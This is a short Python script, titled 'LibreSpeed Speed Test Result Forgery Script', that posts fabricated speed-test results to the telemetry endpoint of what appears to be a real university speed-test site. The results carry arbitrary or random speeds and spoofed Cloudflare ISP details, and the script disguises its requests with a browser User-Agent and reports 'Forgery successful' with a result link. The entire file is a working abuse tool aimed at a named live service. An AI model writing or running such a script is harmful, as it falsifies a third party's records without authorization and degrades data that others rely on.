import requests  
import json  
import random  
import argparse  
  
# Target telemetry endpoint  
TARGET_URL = "https://test.ustc.edu.cn/results/telemetry.php"  
  
def forge_speedtest(dl_speed=None, ul_speed=None):  
    """Forge speed test results and submit"""  
      
    # Use provided speeds or generate random ones  
    download_speed = dl_speed if dl_speed is not None else random.uniform(100, 500)  
    upload_speed = ul_speed if ul_speed is not None else random.uniform(50, 200)  
    
    # no use
    # Construct forged test data  
    fake_data = {  
        'ispinfo': json.dumps({  
            'processedString': '1.1.1.1 - Cloudflare, Inc., US',  
            'rawIspInfo': {  
                'ip': '1.1.1.1',  
                'hostname': 'one.one.one.one',  
                'city': 'Los Angeles',  
                'region': 'California',  
                'country': 'US',  
                'org': 'AS13335 Cloudflare, Inc.'  
            }  
        }),  
        'extra': '',  # Extra data, optional  
        'dl': str(download_speed),  # Download speed (Mbps)  
        'ul': str(upload_speed),    # Upload speed (Mbps)  
        'ping': str(random.uniform(5, 50)),   # Ping (ms)  
        'jitter': str(random.uniform(1, 10)), # Jitter (ms)  
        'log': ''  # Test log, optional  
    }  
      
    # Set User-Agent to simulate browser  
    headers = {  
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',  
        'Accept-Language': 'en-US,en;q=0.9'  
    }  
      
    try:  
        # Send POST request  
        response = requests.post(TARGET_URL, data=fake_data, headers=headers)  
          
        if response.status_code == 200:  
            # Server response format: "id <test_id>"  
            result = response.text.strip()  
            if result.startswith('id '):  
                test_id = result.split(' ')[1]  
                print(f"✓ Forgery successful! Test ID: {test_id}")  
                print(f"  Download speed: {fake_data['dl']} Mbps")  
                print(f"  Upload speed: {fake_data['ul']} Mbps")  
                print(f"  Ping: {fake_data['ping']} ms")  
                print(f"  Result page: https://test.ustc.edu.cn/results/result.php?id={test_id}")  
                return test_id  
            else:  
                print(f"✗ Unexpected server response: {result}")  
                return None  
        else:  
            print(f"✗ Request failed, status code: {response.status_code}")  
            return None  
              
    except Exception as e:  
        print(f"✗ Error occurred: {e}")  
        return None  
  
if __name__ == '__main__':  
    parser = argparse.ArgumentParser(  
        description='LibreSpeed Speed Test Result Forgery Script',  
        formatter_class=argparse.RawDescriptionHelpFormatter,  
        epilog='''  
Examples:  
  uv run main.py --dl 500 --ul 200  
  uv run main.py -d 1000 -u 500  
        '''  
    )  
      
    parser.add_argument(  
        '-d', '--dl',  
        type=float,  
        metavar='MBPS',  
        help='Download speed in Mbps (default: random 100-500)'  
    )  
      
    parser.add_argument(  
        '-u', '--ul',  
        type=float,  
        metavar='MBPS',  
        help='Upload speed in Mbps (default: random 50-200)'  
    )  
      
    args = parser.parse_args()  
      
    print("LibreSpeed Speed Test Result Forgery Script")  
    print("=" * 50)  
    forge_speedtest(dl_speed=args.dl, ul_speed=args.ul)
